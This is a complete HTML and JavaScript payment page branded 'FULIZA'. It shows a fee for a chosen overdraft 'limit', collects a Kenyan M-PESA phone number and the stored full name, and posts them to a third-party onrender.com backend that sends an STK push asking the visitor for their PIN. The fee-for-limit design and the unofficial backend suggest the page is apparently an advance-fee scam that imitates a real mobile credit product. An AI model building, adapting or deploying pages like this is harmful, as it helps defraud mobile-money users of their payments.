<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>FULIZA | Payment</title>

<style>

*{
    box-sizing:border-box;
}

body{
    margin:0;
    padding:16px 10px;
    font-family:Arial,sans-serif;
    background:#00A651;
    color:#000000;
}

.container{
    width:100%;
    max-width:430px;
    margin:0 auto;
}

.card{
    width:100%;
    background:
        linear-gradient(
            145deg,
            rgba(255,255,255,0.09),
            rgba(255,255,255,0.035)
        );

    padding:22px 18px 18px;
    border-radius:18px;

    box-shadow:
        0 20px 60px rgba(0,0,0,0.45),
        inset 0 1px 0 rgba(255,255,255,0.05);

    border:1px solid #000000;
}

/* PAYMENT HEADING */

h1{
    text-align:center;
    background:#000000;
    color:#FFFFFF;
    -webkit-text-stroke:1px #FFFFFF;
    font-size:28px;
    font-weight:800;
    margin:2px 0 16px;
    padding:10px;
    border:1px solid #E31837;
    border-radius:10px;
}

p{
    text-align:center;
    font-size:14px;
    line-height:1.5;
    color:#FFFFFF;
}

.amount{
    background:#FFFFFF;
    border:2px solid #E31837;
    border-radius:12px;
    padding:16px 10px;
    font-size:25px;
    font-weight:800;
    text-align:center;
    color:#000000;
    -webkit-text-stroke:0.8px #000000;
    margin:18px 0;
}

label{
    display:block;
    margin-top:15px;
    margin-bottom:7px;
    font-size:14px;
    font-weight:700;
    color:#FFFFFF;
}

input{
    width:100%;
    padding:14px 12px;
    border:1px solid #000000;
    border-radius:10px;
    font-size:16px;
    background:#FFFFFF;
    color:#000000;
    outline:none;
}

input::placeholder{
    color:#666666;
}

input:focus{
    border-color:#E31837;
    box-shadow:
        0 0 0 3px rgba(227,24,55,0.20);
}

button{
    width:100%;
    padding:15px;
    margin-top:17px;

    background:#000000;

    color:#FFFFFF;
    border:1px solid #E31837;
    border-radius:11px;
    font-size:16px;
    font-weight:700;
    cursor:pointer;

    box-shadow:
        0 10px 30px rgba(0,0,0,0.30);
}

button:hover{
    background:#000000;
}

button:active{
    transform:scale(.98);
}

button:disabled{
    background:rgba(0,0,0,0.35);
    cursor:not-allowed;
    box-shadow:none;
}

#paymentMessage{
    min-height:20px;
    margin-top:13px;
    color:#FFFFFF;
    -webkit-text-stroke:0.6px #000000;
    font-size:15px;
    font-weight:900;
    line-height:1.5;
}

@media(max-width:360px){

    body{
        padding:10px 7px;
    }

    .card{
        padding:18px 13px 15px;
        border-radius:15px;
    }

    h1{
        font-size:24px;
    }

    button{
        padding:14px;
        font-size:15px;
    }

}

</style>

</head>

<body>

<div class="container">

<div class="card">

<h1>Payment</h1>

<p>
Welcome, <strong><span id="name"></span></strong>
</p>

<p>
Complete the payment below to continue with your FULIZA limit request.
</p>


<div class="amount" id="selectedAmount">
Selected Limit: KSh 0
</div>


<div class="amount" id="feeAmount">
Payment Fee: KSh 0
</div>


<label>
Full Name
</label>

<input
    type="text"
    id="fullName"
    readonly
>


<label>
M-PESA Phone Number
</label>

<input
    type="tel"
    id="phone"
    placeholder="07XXXXXXXX"
    autocomplete="tel"
>


<button
    type="button"
    id="payBtn"
    onclick="payNow()"
>
    Continue to Payment
</button>


<p id="paymentMessage"></p>

</div>

</div>


<script>

/* =====================================================
   FULIZA SELECTED LIMIT
===================================================== */

const selectedLimit =
    localStorage.getItem(
        "fulizaaSelectedSlot"
    );


/* =====================================================
   LIMIT + FEE MAPPING
===================================================== */

const fees = {

    "10000": 1,

    "20000": 400,

    "30000": 500,

    "40000": 600,

    "50000": 700,

    "60000": 800,

    "70000": 900,

    "80000": 950,

    "90000": 1000,

    "100000": 1050

};


/* =====================================================
   VALIDATE SELECTED LIMIT
===================================================== */

const paymentFee =
    fees[selectedLimit];


if (
    !selectedLimit ||
    paymentFee === undefined
) {

    document.getElementById(
        "paymentMessage"
    ).textContent =
        "No valid limit was selected.";

} else {

    document.getElementById(
        "selectedAmount"
    ).textContent =
        "Selected Limit: KSh " +
        Number(
            selectedLimit
        ).toLocaleString();


    document.getElementById(
        "feeAmount"
    ).textContent =
        "Payment Fee: KSh " +
        Number(
            paymentFee
        ).toLocaleString();


    localStorage.setItem(
        "fulizaaPaymentFee",
        paymentFee
    );

}


/* =====================================================
   LOAD NAME
===================================================== */

const savedName =
    localStorage.getItem(
        "fulizaFullName"
    );


const firstName =
    savedName
        ? savedName
            .trim()
            .split(/\s+/)[0]
        : "Client";


document.getElementById(
    "name"
).textContent =
    firstName;


document.getElementById(
    "fullName"
).value =
    savedName || "";


/* =====================================================
   CREATE APPLICATION REFERENCE
===================================================== */

let applicationReference =
    localStorage.getItem(
        "fulizaaApplicationReference"
    );


if (!applicationReference) {

    applicationReference =
        "FUL-" +
        Date.now()
            .toString(36)
            .toUpperCase();

    localStorage.setItem(
        "fulizaaApplicationReference",
        applicationReference
    );

}


/* =====================================================
   PAY NOW — REAL STK PUSH
===================================================== */

async function payNow(){

    const message =
        document.getElementById(
            "paymentMessage"
        );

    const payBtn =
        document.getElementById(
            "payBtn"
        );

    const phoneInput =
        document.getElementById(
            "phone"
        );


    /* -----------------------------------------
       VALIDATE LIMIT
    ----------------------------------------- */

    if(
        !selectedLimit ||
        paymentFee === undefined
    ){

        message.textContent =
            "Please select a valid limit first.";

        return;

    }


    /* -----------------------------------------
       PHONE
    ----------------------------------------- */

    const phone =
        phoneInput.value.trim();


    if(!phone){

        message.textContent =
            "Please enter your M-PESA phone number.";

        phoneInput.focus();

        return;

    }


    /* -----------------------------------------
       BASIC KENYAN PHONE VALIDATION
    ----------------------------------------- */

    const cleanPhone =
        phone
            .replace(/\s+/g,"")
            .replace(/-/g,"");


    const validPhone =
        /^(07|01)\d{8}$/.test(cleanPhone) ||
        /^\+254\d{9}$/.test(cleanPhone) ||
        /^254\d{9}$/.test(cleanPhone);


    if(!validPhone){

        message.textContent =
            "Please enter a valid Kenyan phone number.";

        phoneInput.focus();

        return;

    }


    /* -----------------------------------------
       CONVERT TO 254XXXXXXXXX
    ----------------------------------------- */

    let stkPhone =
        cleanPhone;


    if(
        /^(07|01)\d{8}$/.test(stkPhone)
    ){

        stkPhone =
            "254" +
            stkPhone.substring(1);

    }


    if(
        stkPhone.startsWith("+")
    ){

        stkPhone =
            stkPhone.substring(1);

    }


    /* -----------------------------------------
       SAVE LOCAL DATA
    ----------------------------------------- */

    localStorage.setItem(
        "fulizaaPhoneNumber",
        stkPhone
    );


    localStorage.setItem(
        "fulizaaPaymentAmount",
        paymentFee
    );


    localStorage.setItem(
        "fulizaaSelectedLimit",
        selectedLimit
    );


    /* -----------------------------------------
       CREATE PAYMENT REFERENCE
    ----------------------------------------- */

    const paymentReference =
        "PAY-" +
        Date.now()
            .toString(36)
            .toUpperCase();


    localStorage.setItem(
        "fulizaaPaymentReference",
        paymentReference
    );


    /* -----------------------------------------
       DISABLE BUTTON
    ----------------------------------------- */

    payBtn.disabled = true;

    payBtn.textContent =
        "Sending STK Push...";


    message.textContent =
        "Please wait. Sending payment prompt to your M-PESA phone...";


    /* -----------------------------------------
       SEND TO LIVE RENDER BACKEND
    ----------------------------------------- */

    try{

        const response =
            await fetch(
                "https://fuliza-backend-1-o8h6.onrender.com/api/stk-push",
                {

                    method:"POST",

                    headers:{
                        "Content-Type":
                            "application/json"
                    },

                    body:JSON.stringify({

                        phone:
                            stkPhone,

                        amount:
                            Number(
                                paymentFee
                            ),

                        selectedLimit:
                            Number(
                                selectedLimit
                            ),

                        fullName:
                            savedName || "",

                        reference:
                            paymentReference

                    })

                }
            );


        const data =
            await response.json();


        /* -----------------------------------------
           SERVER ERROR
        ----------------------------------------- */

        if(!response.ok){

            throw new Error(

                data.message ||
                data.error ||
                "Unable to send STK Push."

            );

        }


        /* -----------------------------------------
           SAVE SERVER REFERENCE
        ----------------------------------------- */

        if(
            data.transactionId
        ){

            localStorage.setItem(
                "fulizaaTransactionId",
                data.transactionId
            );

        }


        if(
            data.reference
        ){

            localStorage.setItem(
                "fulizaaPaymentReference",
                data.reference
            );

        }


        /* -----------------------------------------
           SUCCESS
        ----------------------------------------- */

        payBtn.textContent =
            "STK Sent";


        message.textContent =
            data.message ||
            "STK Push sent successfully. Check your M-PESA phone and enter your PIN.";


        console.log(
            "Application Reference:",
            applicationReference
        );


        console.log(
            "Payment Reference:",
            data.reference ||
            paymentReference
        );


        console.log(
            "Paylor Response:",
            data
        );


    }catch(error){

        console.error(
            "STK Push Error:",
            error
        );


        message.textContent =
            error.message ||
            "Payment request failed. Please try again.";


        payBtn.disabled =
            false;


        payBtn.textContent =
            "Continue to Payment";

    }

}

</script>

</body>

</html>
